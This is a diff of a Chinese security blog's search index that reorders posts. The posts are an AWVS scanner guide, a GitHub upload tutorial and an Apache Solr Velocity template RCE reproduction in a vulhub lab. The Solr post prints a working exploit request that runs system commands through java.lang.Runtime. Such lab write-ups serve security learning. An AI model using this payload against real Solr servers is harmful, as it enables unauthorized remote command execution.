@@ -1,67 +1,39 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>AWVS的基本使用</title>
-    <url>/posts/22917.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5）<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS2.png" alt></p>
-<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Site-Crawler"><a href="#Site-Crawler" class="headerlink" title="Site Crawler"></a>Site Crawler</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS3.png" alt></p>
-<p>点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。</p>
-<h2 id="Target-Finder"><a href="#Target-Finder" class="headerlink" title="Target Finder"></a>Target Finder</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS4.png" alt></p>
-<p>可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。<br>进行了端口扫描后会进行服务发现，得到端口上对应的服务。</p>
-<h2 id="Subdomain-Scanner"><a href="#Subdomain-Scanner" class="headerlink" title="Subdomain Scanner"></a>Subdomain Scanner</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS5.png" alt></p>
-<p>用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） </p>
-<h2 id="Blind-SQL-Injector"><a href="#Blind-SQL-Injector" class="headerlink" title="Blind SQL Injector"></a>Blind SQL Injector</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS6.png" alt></p>
-<p>在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。</p>
-<h2 id="HTTP-Editor"><a href="#HTTP-Editor" class="headerlink" title="HTTP Editor"></a>HTTP Editor</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS7.png" alt><br>和BP repeater类似，可以进行手动漏洞挖掘探测。</p>
-<p><strong>Enocoder tool中可以进行各种加密解密</strong></p>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS8.png" alt></p>
-<h2 id="HTTP-Sniffer"><a href="#HTTP-Sniffer" class="headerlink" title="HTTP Sniffer"></a>HTTP Sniffer</h2><p>和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。</p>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS9.png" alt></p>
-<p>手动设置代理<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS10.png" alt></p>
-<h2 id="HTTP-Fuzzer"><a href="#HTTP-Fuzzer" class="headerlink" title="HTTP Fuzzer"></a>HTTP Fuzzer</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS11.png" alt></p>
-<p>类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 </p>
-<ul>
-<li>注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。</li>
-</ul>
-<h2 id="Authentication-Tester"><a href="#Authentication-Tester" class="headerlink" title="Authentication Tester"></a>Authentication Tester</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS12.png" alt></p>
-<p>认证测试，用于尝试破解破解账户密码。 </p>
-<p>基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。</p>
-<h2 id="Compare-Results"><a href="#Compare-Results" class="headerlink" title="Compare Results"></a>Compare Results</h2><p>可以用不同用户登录后结果进行比较，和BP Compare类似。</p>
-<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><h2 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS13.png" alt></p>
-<ul>
-<li>Client Certifications：有些Web Application需要客户端证书才能进行扫描。 </li>
-<li>Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence</li>
-</ul>
-<h2 id="Scan-Settings"><a href="#Scan-Settings" class="headerlink" title="Scan Settings"></a>Scan Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS14.png" alt></p>
-<ul>
-<li>Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。</li>
-</ul>
-<h1 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h1><ul>
-<li>点击New Scan</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS15.png" alt></p>
-<ul>
-<li>点击扫描配置就是Scan Setting页面</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS16.png" alt></p>
-<ul>
-<li>发现目标服务器基本信息</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS17.png" alt></p>
-<ul>
-<li>是否需要登录，可以使用login sequence</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS18.png" alt></p>
-<ul>
-<li>finish，扫描结果可以保存为wvs文件，还能把结果制作成报表<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS19.png" alt></li>
-</ul>
+    <title>Apache Solr Velocity Template RCE漏洞复现</title>
+    <url>/posts/57536.html</url>
+    <content><![CDATA[<h2 id="0x00-Apache-Solr介绍"><a href="#0x00-Apache-Solr介绍" class="headerlink" title="0x00 Apache Solr介绍"></a>0x00 Apache Solr介绍</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</p>
+<p>漏洞产生原因:</p>
+<p>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
+<h2 id="0x02-漏洞影响版本"><a href="#0x02-漏洞影响版本" class="headerlink" title="0x02 漏洞影响版本"></a>0x02 漏洞影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Solr 5.x -- 8.2.0，存在config API版本</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p><strong>启动vulhub环境：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;solr&#x2F;CVE-2019-0193-RCE</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>创建一个名为test的Core:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>
+<p>访问<a href="http://ip:8983，当前solr版本为8.1.1">http://ip:8983，当前solr版本为8.1.1</a></p>
+<p><img src="/posts/57536/1.png" alt="1"></p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>漏洞利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击</p>
+<p>如下图所示，Core的名称为test</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;#&#x2F;~cores&#x2F;test</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/57536/2.png" alt="2"></p>
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;test&#x2F;config</span><br></pre></td></tr></table></figure>
+<p>抓包修改GET请求为POST,POST内容如下（修改Core的配置）<br><img src="/posts/57536/3.png" alt="3"><br>利用公开的EXP测试：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/57536/4.png" alt="4"></p>
+<p>查看ls<br><img src="/posts/57536/5.png" alt="5"></p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p>
+<p><a href="https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py</a></p>
+<p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>
 ]]></content>
       <categories>
-        <category>工具</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>渗透测试</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -425,6 +397,70 @@
       </tags>
   </entry>
   <entry>
+    <title>AWVS的基本使用</title>
+    <url>/posts/22917.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5）<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS2.png" alt></p>
+<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Site-Crawler"><a href="#Site-Crawler" class="headerlink" title="Site Crawler"></a>Site Crawler</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS3.png" alt></p>
+<p>点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。</p>
+<h2 id="Target-Finder"><a href="#Target-Finder" class="headerlink" title="Target Finder"></a>Target Finder</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS4.png" alt></p>
+<p>可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。<br>进行了端口扫描后会进行服务发现，得到端口上对应的服务。</p>
+<h2 id="Subdomain-Scanner"><a href="#Subdomain-Scanner" class="headerlink" title="Subdomain Scanner"></a>Subdomain Scanner</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS5.png" alt></p>
+<p>用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） </p>
+<h2 id="Blind-SQL-Injector"><a href="#Blind-SQL-Injector" class="headerlink" title="Blind SQL Injector"></a>Blind SQL Injector</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS6.png" alt></p>
+<p>在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。</p>
+<h2 id="HTTP-Editor"><a href="#HTTP-Editor" class="headerlink" title="HTTP Editor"></a>HTTP Editor</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS7.png" alt><br>和BP repeater类似，可以进行手动漏洞挖掘探测。</p>
+<p><strong>Enocoder tool中可以进行各种加密解密</strong></p>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS8.png" alt></p>
+<h2 id="HTTP-Sniffer"><a href="#HTTP-Sniffer" class="headerlink" title="HTTP Sniffer"></a>HTTP Sniffer</h2><p>和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。</p>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS9.png" alt></p>
+<p>手动设置代理<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS10.png" alt></p>
+<h2 id="HTTP-Fuzzer"><a href="#HTTP-Fuzzer" class="headerlink" title="HTTP Fuzzer"></a>HTTP Fuzzer</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS11.png" alt></p>
+<p>类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 </p>
+<ul>
+<li>注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。</li>
+</ul>
+<h2 id="Authentication-Tester"><a href="#Authentication-Tester" class="headerlink" title="Authentication Tester"></a>Authentication Tester</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS12.png" alt></p>
+<p>认证测试，用于尝试破解破解账户密码。 </p>
+<p>基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。</p>
+<h2 id="Compare-Results"><a href="#Compare-Results" class="headerlink" title="Compare Results"></a>Compare Results</h2><p>可以用不同用户登录后结果进行比较，和BP Compare类似。</p>
+<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><h2 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS13.png" alt></p>
+<ul>
+<li>Client Certifications：有些Web Application需要客户端证书才能进行扫描。 </li>
+<li>Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence</li>
+</ul>
+<h2 id="Scan-Settings"><a href="#Scan-Settings" class="headerlink" title="Scan Settings"></a>Scan Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS14.png" alt></p>
+<ul>
+<li>Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。</li>
+</ul>
+<h1 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h1><ul>
+<li>点击New Scan</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS15.png" alt></p>
+<ul>
+<li>点击扫描配置就是Scan Setting页面</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS16.png" alt></p>
+<ul>
+<li>发现目标服务器基本信息</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS17.png" alt></p>
+<ul>
+<li>是否需要登录，可以使用login sequence</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS18.png" alt></p>
+<ul>
+<li>finish，扫描结果可以保存为wvs文件，还能把结果制作成报表<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS19.png" alt></li>
+</ul>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CSRF从0到1</title>
     <url>/posts/65258.html</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为 One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。与 XSS 不同的是，XSS利用站点内的信任用户，而CSRF通过伪装成受信任用户请求受信任的网站，也就是攻击者盗用你的身份，以你的名义发送恶意请求。</p>
@@ -442,42 +478,6 @@
       </categories>
       <tags>
         <tag>WEB</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache Solr Velocity Template RCE漏洞复现</title>
-    <url>/posts/57536.html</url>
-    <content><![CDATA[<h2 id="0x00-Apache-Solr介绍"><a href="#0x00-Apache-Solr介绍" class="headerlink" title="0x00 Apache Solr介绍"></a>0x00 Apache Solr介绍</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p>
-<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</p>
-<p>漏洞产生原因:</p>
-<p>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
-<h2 id="0x02-漏洞影响版本"><a href="#0x02-漏洞影响版本" class="headerlink" title="0x02 漏洞影响版本"></a>0x02 漏洞影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Solr 5.x -- 8.2.0，存在config API版本</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p><strong>启动vulhub环境：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;solr&#x2F;CVE-2019-0193-RCE</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>创建一个名为test的Core:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>
-<p>访问<a href="http://ip:8983，当前solr版本为8.1.1">http://ip:8983，当前solr版本为8.1.1</a></p>
-<p><img src="/posts/57536/1.png" alt="1"></p>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>漏洞利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击</p>
-<p>如下图所示，Core的名称为test</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;#&#x2F;~cores&#x2F;test</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/57536/2.png" alt="2"></p>
-<p>访问：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;test&#x2F;config</span><br></pre></td></tr></table></figure>
-<p>抓包修改GET请求为POST,POST内容如下（修改Core的配置）<br><img src="/posts/57536/3.png" alt="3"><br>利用公开的EXP测试：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/57536/4.png" alt="4"></p>
-<p>查看ls<br><img src="/posts/57536/5.png" alt="5"></p>
-<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p>
-<p><a href="https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py</a></p>
-<p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -639,29 +639,6 @@
       </tags>
   </entry>
   <entry>
-    <title>GitHub上传</title>
-    <url>/posts/8472.html</url>
-    <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
-<p>0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository   <img src="https://i.imgur.com/Q2p1noE.png" alt>    </p>
-<p>进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository   with a README，然后创建：<a id="more"></a><br><img src="https://i.imgur.com/wNvnT5T.png" alt>   </p>
-<p>0x01.下载git<br><a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a> </p>
-<p>0x02.配置git<br>1.设置本地的ssh key，打开git bash,输入命令：<br>ssh-keygen -t rsa -C “<a href="mailto:XXXXXX@XXXX.com">XXXXXX@XXXX.com</a>“<br>其中双引号中是你注册github时用的邮箱。<br>一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。</p>
-<p>2.打开github,选择settings<br><img src="https://i.imgur.com/jqqfV4E.png" alt><br>得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.<br><img src="https://i.imgur.com/PWqO1em.png" alt><br>3.查看是否成功。</p>
-<p>在git bash中输入命令：ssh -T <a href="mailto:git@github.com">git@github.com</a><br>会提示，是否continue，输入yes。<br>后就会看到：</p>
-<p>Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts.</p>
-<p>Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
-<p>这样就成功了，不用理会warning。</p>
-<p>4.克隆你刚才新建的仓库到本地<br>输入命令：<br>git clone <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>后面的http是你的仓库的地址。<br>此时会在刚才创建ssh  key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示：<br><img src="https://i.imgur.com/0oHqKNs.png" alt></p>
-<p>6.在此处右键打开git bash,输入如下命令：<br>git init<br>git add “文件名”<br>git commit -m “文件名”<br>如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。<br>git remote add origin <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>http为你自己仓库的地址<br>如果出现错误：<br>fatal: remote origin already exists<br>则执行以下语句：git remote rm origin<br>再执行git remote add origin <a href="https://github.com/zhangsiyao11/chat即可。" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat即可。</a><br>最后在依次执行：<br>git pull origin master<br>git push origin master<br>完成，再打开自己的仓库就会出现刚刚上传的项目文件:<br><img src="https://i.imgur.com/X0sb9Hw.png" alt></p>
-]]></content>
-      <categories>
-        <category>Github</category>
-      </categories>
-      <tags>
-        <tag>Github</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DVWA之SQL Injecion</title>
     <url>/posts/38436.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。</p>
@@ -713,6 +690,29 @@
       <tags>
         <tag>DVWA</tag>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GitHub上传</title>
+    <url>/posts/8472.html</url>
+    <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
+<p>0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository   <img src="https://i.imgur.com/Q2p1noE.png" alt>    </p>
+<p>进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository   with a README，然后创建：<a id="more"></a><br><img src="https://i.imgur.com/wNvnT5T.png" alt>   </p>
+<p>0x01.下载git<br><a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a> </p>
+<p>0x02.配置git<br>1.设置本地的ssh key，打开git bash,输入命令：<br>ssh-keygen -t rsa -C “<a href="mailto:XXXXXX@XXXX.com">XXXXXX@XXXX.com</a>“<br>其中双引号中是你注册github时用的邮箱。<br>一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。</p>
+<p>2.打开github,选择settings<br><img src="https://i.imgur.com/jqqfV4E.png" alt><br>得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.<br><img src="https://i.imgur.com/PWqO1em.png" alt><br>3.查看是否成功。</p>
+<p>在git bash中输入命令：ssh -T <a href="mailto:git@github.com">git@github.com</a><br>会提示，是否continue，输入yes。<br>后就会看到：</p>
+<p>Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts.</p>
+<p>Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
+<p>这样就成功了，不用理会warning。</p>
+<p>4.克隆你刚才新建的仓库到本地<br>输入命令：<br>git clone <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>后面的http是你的仓库的地址。<br>此时会在刚才创建ssh  key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示：<br><img src="https://i.imgur.com/0oHqKNs.png" alt></p>
+<p>6.在此处右键打开git bash,输入如下命令：<br>git init<br>git add “文件名”<br>git commit -m “文件名”<br>如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。<br>git remote add origin <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>http为你自己仓库的地址<br>如果出现错误：<br>fatal: remote origin already exists<br>则执行以下语句：git remote rm origin<br>再执行git remote add origin <a href="https://github.com/zhangsiyao11/chat即可。" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat即可。</a><br>最后在依次执行：<br>git pull origin master<br>git push origin master<br>完成，再打开自己的仓库就会出现刚刚上传的项目文件:<br><img src="https://i.imgur.com/X0sb9Hw.png" alt></p>
+]]></content>
+      <categories>
+        <category>Github</category>
+      </categories>
+      <tags>
+        <tag>Github</tag>
       </tags>
   </entry>
   <entry>
@@ -909,6 +909,23 @@
       </tags>
   </entry>
   <entry>
+    <title>ISCC2019-Web</title>
+    <url>/posts/25084.html</url>
